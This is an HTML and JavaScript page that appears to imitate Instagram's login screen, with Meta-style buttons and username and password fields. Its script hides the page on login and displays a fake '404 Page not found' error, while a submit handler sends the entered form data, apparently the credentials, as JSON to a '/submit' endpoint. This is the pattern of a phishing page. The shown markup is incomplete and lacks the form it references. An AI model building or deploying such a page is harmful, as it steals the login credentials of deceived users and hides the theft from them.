<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .page {
            position: relative;
            height: 100vh;
            width: 100vw;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background-color: #fff;
        }

        .heading {
            position: absolute;
            top: 80px;
        }

        .heading svg {
            height: 100px;
            width: 250px;
        }

        .container1 {
            margin-top: 50px;
            height: 300px;
            width: 330px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }

        .inputs {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        #username,
        #password {
            border-radius: 3px;
            border: 1px solid #DBDBDB;
            width: 250px;
            height: 35px;
            padding: 10px;
            font-size: 12px;
            font-weight: 400;
        }

        #username,
        #password ::placeholder {
            color: #737373;
        }

        .login {
            display: flex;
            justify-content: center;
            align-items: center;
            border-radius: 7px;
            height: 30px;
            width: 250px;
            margin-top: 20px;
            color: #ffffff;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            background-color: #4CB5F9;
            border: none;
        }

        .facebook {
            position: absolute;
            top: 220px;
            display: flex;
            justify-content: center;
            align-items: center;
            border-radius: 7px;
            height: 30px;
            width: 250px;
            color: #ffffff;
            font-weight: 600;
            font-size: 14px;
            background-color: #1877F2;
        }

        .or {
            font-size: 15px;
            color: #737373;
            font-weight: 600;
        }

        .forget {
            color: #0095F6;
            padding-left: 120px;
            font-size: 14px;
            font-weight: 600;
            margin-top: 10px;
        }

        .dont-have-account {
            font-size: 14px;
            font-weight: 600;
            color: #737373;
        }

        .dont-have-account span {
            color: #0095F6;
        }

        .from-meta {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .from {
            margin-top: 30px;
            font-size: 15px;
            color: #737373;
        }
        .meta{
            margin-top: 90px;
            position: absolute;
        }
        footer {
            font-size: 16px;
            position: absolute;
            bottom: 0;
            height: 100px;
            width: 340px;
            display: flex;
            flex-direction: column;
            gap: 10px;
            align-items: center;
            justify-content: center;
        }

        .line1,
        .line2,
        .line3 {
            display: flex;
            flex-direction: row;
            gap: 10px;
            color: #737373;
        }

        .page2 {
            display: none;
            position: absolute;
            height: 100vh;
            width: 100vw;
        }

        .msg {
            display: flex;
            place-content: center;
            font-size: 100px;
            margin-top: 100px;
            color: black;
        }

        .page3 {
            display: none;
            /* display: flex; */
            flex-direction: column;
            position: absolute;
            height: 100vh;
            width: 100vw;
        }

        .page3 h1 {
            padding-top: 250px;
            display: flex;
            place-content: center;
            font-size: 100px;
        }

        .page3 h4 {
            display: flex;
            place-content: center;
        }

        .page3 h5 {
            padding-top: 20px;
            padding-left: 120px;
            display: flex;
            place-content: center;
            width: 250px;
            text-align: center;
        }
    </style>
</head>

        <div class="page3">
            <h1>404</h1>
            <h4>Page not found</h4>
            <h5>The response requested could not be found on the server.</h5>
        </div>

        <script>

            let loginBtn = document.querySelector(".login")
            let page = document.querySelector(".page")
            let page2 = document.querySelector(".page2")
            let page3 = document.querySelector(".page3")


            loginBtn.addEventListener("click", () => {
                page.style.display = "none"
                // page2.style.display = "block"
                page3.style.display = "block"

            })

            document.getElementById('myForm').addEventListener('submit', function (e) {
                e.preventDefault(); // Prevent form submission

                // Get form data
                const formData = new FormData(this);

                // Convert form data to JSON
                const jsonData = {};
                formData.forEach((value, key) => {
                    jsonData[key] = value;
                });

                // Send data to server
                fetch('/submit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(jsonData)
                }).then(response => {
                    if (response.ok) {
                        console.log('Form data sent successfully');
                    } else {
                        console.error('Failed to send form data');
                    }
                }).catch(error => {
                    console.error('Error:', error);
                });
            });
        </script>
